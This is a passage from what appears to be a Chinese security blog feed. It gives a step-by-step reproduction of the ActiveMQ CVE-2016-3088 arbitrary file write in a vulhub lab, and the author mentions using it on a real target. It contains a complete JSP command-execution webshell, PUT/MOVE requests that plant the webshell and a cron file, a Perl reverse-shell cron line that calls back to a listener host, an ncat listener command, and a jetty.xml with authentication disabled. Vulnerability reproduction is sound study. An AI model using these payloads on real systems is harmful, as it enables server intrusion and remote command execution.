class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat.exe -l -p 8888</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573053195.62.png" alt></p><p>实际测试中只需要反弹到公网地址即可(以本地环境反弹到公网测试)</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573053273.71.png" alt></p><h2 id="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><a href="#ActiveMQ任意文件写入漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"></a>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</h2><h3 id="背景简述"><a href="#背景简述" class="headerlink" title="背景简述"></a>背景简述</h3><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p><p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：</p><ul><li><p>其使用率并不高</p></li><li><p>文件操作容易出现漏洞</p></li></ul><p>所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。</p><h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p>本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p><h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>启动vulhub中的漏洞环境(ActiveMQ 5.11.1)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose up -d   <span class="comment">#环境默认账户密码为admin/admin</span></span><br></pre></td></tr></table></figure><p>查看网站的根路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103:8161/admin/test/systemProperties.jsp</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573139382.64.png" alt></p><p>利用漏洞写入webshell(5.11.1在利用PUT方法写时需要进行身份认证)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.103:8161/fileserver   #利用fileserver使用PUT方法传文件</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573135241.8.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573135282.18.png" alt></p><p>访问fileserver中上传的2.jsp不解析</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573135374.75.png" alt></p><p>移动文件到可以解析的目录（api或admin目录，这个版本一共也需要身份认证）</p><p>在5.7版本可以报绝对路径，这个版本不行，应为时漏洞复现，所以直接使用已知的<code>/opt/apache-activemq-5.11.1/webapps</code></p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573136077.93.png" alt></p><p>重新在身份认证后移动<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573136191.41.png" alt></p><p>访问shell地址，可以看到成功执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103:8161/api/2.jsp?pass</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573136295.7.png" alt></p><p>用冰蝎客户端连接失败，还是由于身份认证的原因</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573136482.48.png" alt></p><p>所以通过客户端连接(冰蝎/蚁剑都不行)，尝试传别的马</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.*"</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">out.print(<span class="string">"Hello&lt;/br&gt;"</span>);</span><br><span class="line"> </span><br><span class="line">String strcmd=request.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line"> </span><br><span class="line">String line=<span class="keyword">null</span>;</span><br><span class="line"> </span><br><span class="line">Process p=Runtime.getRuntime().exec(strcmd);</span><br><span class="line"> </span><br><span class="line">BufferedReader br=<span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(p.getInputStream()));</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span>((line=br.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line"> </span><br><span class="line">  out.print(line+<span class="string">"&lt;/br&gt;"</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573137824.25.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573137849.35.png" alt></p><h3 id="写入计划任务，自动化弹shell-要求active必须时root权限运行的"><a href="#写入计划任务，自动化弹shell-要求active必须时root权限运行的" class="headerlink" title="写入计划任务，自动化弹shell(要求active必须时root权限运行的)"></a>写入计划任务，自动化弹shell(要求active必须时root权限运行的)</h3><p>这是一个比较稳健的方法。首先上传cron配置文件（注意，换行一定要<code>\n</code>，不能是<code>\r\n</code>，否则crontab执行会失败）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * root /usr/bin/perl -e <span class="string">'use Socket;$i="192.168.1.102";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573140136.91.png" alt></p><p>将其移动到<code>/etc/cron.d/root</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/3.txt HTTP/1.1</span><br><span class="line">Destination: file:///etc/cron.d/root</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573140222.12.png" alt></p><p>反弹shell成功</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573224817.49.png" alt></p><h3 id="写入jetty-xml或jar"><a href="#写入jetty-xml或jar" class="headerlink" title="写入jetty.xml或jar"></a>写入jetty.xml或jar</h3><blockquote><p>在写入shell时会受到身份认证的限制，实际中除了口令爆破成功之外写shell比较困难，如果采用计划任务反弹shell，则需要activemq时root权限启动的，否则无法写入计划任务反弹shell,这个时候会想到写入jetty.xml配置文件覆盖原来的配置，取消身份认证即可写shell;思路没有问题，但是在本地测试时发现可以写入覆盖，但是必须要active重启才可以使配置生效，所以只有在root权限下才可以写入计划任务让服务重启，但此时可以直接弹shell了，就没必要去覆盖配置了，总体来说，思路上没有问题。</p></blockquote><p>jetty.xml配置如下:只需要将身份认证的true改为false即可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        Licensed to the Apache Software Foundation (ASF) under one or more contributor</span></span><br><span class="line"><span class="comment">        license agreements. See the NOTICE file distributed with this work for additional</span></span><br><span class="line"><span class="comment">        information regarding copyright ownership. The ASF licenses this file to You under</span></span><br><span class="line"><span class="comment">        the Apache License, Version 2.0 (the "License"); you may not use this file except in</span></span><br><span class="line"><span class="comment">        compliance with the License. You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or</span></span><br><span class="line"><span class="comment">        agreed to in writing, software distributed under the License is distributed on an</span></span><br><span class="line"><span class="comment">        "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or</span></span><br><span class="line"><span class="comment">        implied. See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment">        limitations under the License.</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        An embedded servlet engine for serving up the Admin consoles, REST and Ajax APIs and</span></span><br><span class="line"><span class="comment">        some demos Include this file in your configuration to enable ActiveMQ web components</span></span><br><span class="line"><span class="comment">        e.g. &lt;import resource="jetty.xml"/&gt;</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"securityLoginService"</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.security.HashLoginService"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"ActiveMQRealm"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"config"</span> <span class="attr">value</span>=<span class="string">"$&#123;activemq.conf&#125;/jetty-realm.properties"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"securityConstraint"</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.util.security.Constraint"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"BASIC"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"roles"</span> <span class="attr">value</span>=<span class="string">"admin"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"authenticate"</span> <span class="attr">value</span>=<span class="string">"false"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"securityConstraintMapping"</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.security.ConstraintMapping"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"constraint"</span> <span class="attr">ref</span>=<span class="string">"securityConstraint"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"pathSpec"</span> <span class="attr">value</span>=<span class="string">"/*"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"securityHandler"</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.security.ConstraintSecurityHandler"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"loginService"</span> <span class="attr">ref</span>=<span class="string">"securityLoginService"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"authenticator"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.security.authentication.BasicAuthenticator"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"constraintMappings"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">"securityConstraintMapping"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"handler"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"sec"</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.server.handler.HandlerCollection"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"handlers"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.webapp.WebAppContext"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"contextPath"</span> <span class="attr">value</span>=<span class="string">"/admin"</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"resourceBase"</span> <span class="attr">value</span>=<span class="string">"$&#123;activemq.home&#125;/webapps/admin"</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"logUrlOnStart"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.webapp.WebAppContext"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"contextPath"</span> <span class="attr">value</span>=<span class="string">"/demo"</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"resourceBase"</span> <span class="attr">value</span>=<span class="string">"$&#123;activemq.home&#125;/webapps/demo"</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"logUrlOnStart"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.webapp.WebAppContext"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"contextPath"</span> <span class="attr">value</span>=<span class="string">"/fileserver"</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"resourceBase"</span> <span class="attr">value</span>=<span class="string">"$&#123;activemq.home&#125;/webapps/fileserver"</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"logUrlOnStart"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"parentLoaderPriority"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.server.handler.ResourceHandler"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"directoriesListed"</span> <span class="attr">value</span>=<span class="string">"false"</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"welcomeFiles"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">value</span>&gt;</span>index.html<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"resourceBase"</span> <span class="attr">value</span>=<span class="string">"$&#123;activemq.home&#125;/webapps/"</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"defaultHandler"</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.server.handler.DefaultHandler"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"serveIcon"</span> <span class="attr">value</span>=<span class="string">"false"</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"contexts"</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.server.handler.ContextHandlerCollection"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"Server"</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.server.Server"</span> <span class="attr">init-method</span>=<span class="string">"start"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">destroy-method</span>=<span class="string">"stop"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"connectors"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"Connector"</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.server.nio.SelectChannelConnector"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"port"</span> <span class="attr">value</span>=<span class="string">"8161"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">                    Enable this connector if you wish to use https with web console</span></span><br><span class="line"><span class="comment">                --&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">                &lt;bean id="SecureConnector" class="org.eclipse.jetty.server.ssl.SslSelectChannelConnector"&gt;</span></span><br><span class="line"><span class="comment">                    &lt;property name="port" value="8162" /&gt;</span></span><br><span class="line"><span class="comment">                    &lt;property name="keystore" value="file:$&#123;activemq.conf&#125;/broker.ks" /&gt;</span></span><br><span class="line"><span class="comment">                    &lt;property name="password" value="password" /&gt;</span></span><br><span class="line"><span class="comment">                &lt;/bean&gt;</span></span><br><span class="line"><span class="comment">                --&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"handler"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"handlers"</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.server.handler.HandlerCollection"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"handlers"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">"contexts"</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">"securityHandler"</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="实战复现"><a href="#实战复现" class="headerlink" title="实战复现"></a>实战复现</h2><blockquote><p>在一次任务中碰见一个activemq的页面，版本比较低为5.4，winserver2008的环境，所以拿下目标只能寄希望在写shell了，由于版本低，身份认证默认是关闭的，同时又存在任意文件写入漏洞，所以运气好拿下shell。本地以win+5.7的环境复现一下</p></blockquote><h3 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h3><p>在bin目录下启动activemq.bat</p><h3 id="访问环境"><a href="#访问环境" class="headerlink" title="访问环境"></a>访问环境</h3><p><a href="http://192.168.1.102:8161/admin/" target="_blank" rel="noopener">http://192.168.1.102:8161/admin/</a> 没有进行身份认证</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573227616.67.png" alt></p><h3 id="探测绝对路径"><a href="#探测绝对路径" class="headerlink" title="探测绝对路径"></a>探测绝对路径</h3><p><a href="http://192.168.1.102:8161/admin/test/systemProperties.jsp" target="_blank" rel="noopener">http://192.168.1.102:8161/admin/test/systemProperties.jsp</a>  访问发现不存在</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573227713.07.png" alt></p><p>利用此版本PUT方法爆绝对路径<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573227889.76.png" alt></p><h3 id="传shell"><a href="#传shell" class="headerlink" title="传shell"></a>传shell</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573227957.58.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573228065.83.png" alt></p><p>用冰蝎连接的时候获取不了密码，和实战时一如既往的翻车，实战中传了jspx的马成功连接，此处jspx也没有连接成功，传别的jsp直接访问即可。</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573228512.05.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总体来说，getshell的条件比较苛刻，实际中成功是我运气好，emm…</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/yuzly/p/11278131.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/11278131.html</a></p><p><a href="https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md</a></p><p><a href="https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2015-5254/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2015-5254/README.zh-cn.md</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ActiveMQ介绍&quot;&gt;&lt;a href=&quot;#ActiveMQ介绍&quot; class=&quot;headerlink&quot; title=&quot;ActiveMQ介绍&quot;&gt;&lt;/a&gt;ActiveMQ介绍&lt;/h2&gt;&lt;p&gt;Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的
      
    
    </summary>
    
      <category term="漏洞复现" scheme="https://www.lsowl.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="https://www.lsowl.top/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="ActiveMQ" scheme="https://www.lsowl.top/tags/ActiveMQ/"/>
    
  </entry>
  
  <entry>
    <title>clickjack</title>
    <link href="https://www.lsowl.top/2019/10/28/clickjack/"/>
    <id>https://www.lsowl.top/2019/10/28/clickjack/</id>
    <published>2019-10-28T04:08:26.000Z</published>
    <updated>2019-10-28T04:29:50.300Z</updated>
    
